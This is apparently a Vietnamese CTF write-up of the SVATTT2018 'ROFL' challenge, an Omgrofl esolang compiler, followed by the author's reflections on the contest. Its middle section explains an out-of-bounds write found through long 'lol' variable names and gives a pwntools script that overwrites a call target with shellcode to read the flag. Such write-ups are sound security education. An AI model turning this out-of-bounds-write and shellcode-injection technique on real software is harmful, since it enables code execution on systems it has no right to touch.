---
layout: post
title: "[SVATTT2018] ROFL"
---

## ROFL
Bài này là một compiler ngôn ngữ  [omgrofl](https://esolangs.org/wiki/Omgrofl) gì đấy. Bài được chạy trên web chứ không phải netcat đến. Mới vào mình đã tìm đc binary nhưng quả thực là để có thể reverse được bài này rất khó. Riêng việc mở trên IDA để decompile đã mất 5-10p rồi (binary hơn 6mb @@ ). 

![](https://i.imgur.com/lKw9SI1.png)

Nhưng teammate mình (anh **bo8**) có thấy các instructions của **omgrofl** trong decompile này lòi ra thêm instruction **imho** (im hộ) so với bản chính. Instruction này có chức năng reverse lại số nhập vào.

![](https://i.imgur.com/cTYCnPa.png)

Nên có thể đoán đc lỗi ở đâu đây liên quan đến hàm này, nhưng mà càng debug càng rối... 

Sau đó ban tổ chức có cho 1 hint đại khái là *cách lưu biến ở trong omgrofl*. **bo8** liền nhận ra là lỗi chắc chắn liên quan đến cái **lol lol** gì đó ròi. Vì trong omgrofl, nó khởi tạo biến bằng các lệnh **l[o]l** với chữ`o` thay đổi.

Mình thử lần đầu tiên nhưng chẳng có gì xảy ra cả, sau đó tăng số lượng `lol` lên thì ... 

![](https://i.imgur.com/GWTqHub.png)

**segmentation fault** rồi nhé :)))

Debug bằng gdb thì thấy lỗi ở ```mov    QWORD PTR [rdx+rcx*8],rbx```

![](https://i.imgur.com/UV4y8tf.png)

Sau vài lần chạy thử thì ta thấy được rằng khoảng cách từ thành ghi rdx đến giá trị gọi hàm ```call   0x7ffff7ff5081`` là không đổi, đồng thời thanh ghi rbx cũng bằng chính giá trị mà ta gán vào **lol**

Vậy có thể dễ dàng nghĩ ra cách exploit lỗi out-of-bound write này bằng cách tính toán số lượng **o** để ghi shellcode vào địa chính địa chỉ `0x7ffff7ff5081` ( rdx + rcx*8 = `0x7ffff7ff5081` )

Đoạn code generate payload mình cũng đơn giản : 

```python
	pl=""
	x="l{0}l iz {1}\n"
	y="imho l{0}l"
	sc=asm(shellcraft.amd64.linux.cat('flag','1'))
	sc_l=len(sc)
	print sc_l%8
	sc=sc.ljust(sc_l+8-sc_l%8,'\x90')
	num=531
	for i in xrange(len(sc)/8):
		pl+=x.format('o'*(num+i),u64(sc[i*8:i*8+8]))
	pl+=y.format('o'*num)
	writefile('test',pl)
```

![](https://i.imgur.com/oUAaNMw.png)

Sau đó chỉ cần up payload lên thôi. Bài này ko hiểu sao tool patch của mình không patch được, với cả binary quá lớn để có thể thấy lỗi thực sự nằm đâu ...

Và với payload và kiểu chơi atk/def như này thì payload mình nhanh chóng bị replay :)). Mình đã nóng vội khi đã submit quá sớm mà ko encrypt kĩ, nhưng team mình là đội duy nhất làm được bài này và với lỗi như trên thì sớm muộn gì cũng có đội nhận ra lỗi nằm ở **lol**. Và lol lại là thứ ko thể giấu được trong payload nên cũng đành thôi...

Kết quả đội chỉ đạt #3 và giải nhì, đó cũng có lỗi của mình. Xin lỗi anh em bmtd, bo8, joker, xin lỗi thầy và các fan mến mộ UIT :(. 

Lần này đã là lần thứ ba mình tham gia. Nhưng cảm giác không còn như 2 lần trước nữa. 

Năm 2016 không qua được vòng lại, nhưng nhìn các đàn anh đáng kính thi final castle năm ấy thật sự rất phấn khích và gay cấn.

Năm 2017 đến được vòng chung kết tuy giải không cao nhưng cũng rất gay cấn và thú vị (thọt bài arm vì lỗi linh tinh :(( )

Năm nay quả thực thi xong chả gì đọng lại cả, chỉ thấy mọi người tranh cãi hết chuyện này đến chuyện kia. BTC năm nay cũng đã rất cố gắng để tạo ra sân chơi và các challenges cho các đội. Mặc dù còn nhiều thiếu sót về rules, cấu hình hay các chuyện bên lề nhưng như anh ML đã nói, tạo ra challenges cho một giải sinh viên rất khó, làm sao để vừa đánh giá được thực lực của sinh viên và vừa phù hợp với thời gian 8 tiếng cuộc thi nên mình rất thông cảm cho BTC. Mong trong tương lai sẽ có những thay đổi phù hợp hơn. 

Còn về đội giải nhất, họ đã có chiến thuật rất hợp lí nên thắng là xứng đáng rồi. Khi meta game thay đổi, đội nào là đội thích ứng nhanh hơn là đội giành chiến thắng thôi. 

Nhưng với bản thân mình chỉ thích tấn công và lại vào team chỉ thích tấn công nên trong cuộc thi atk/def thua là phải rồi :)). Cả team đến tận phút cuối vẫn không thèm bật tcpdump :))

Cảm ơn các anh em đã chơi cùng mình, cảm ơn thầy và các bạn ở nhà làm đồ án giùm xD , cảm ơn btc đã tổ chức nên cuộc thi này. Hi vọng lần sau không phải thi nữa :)
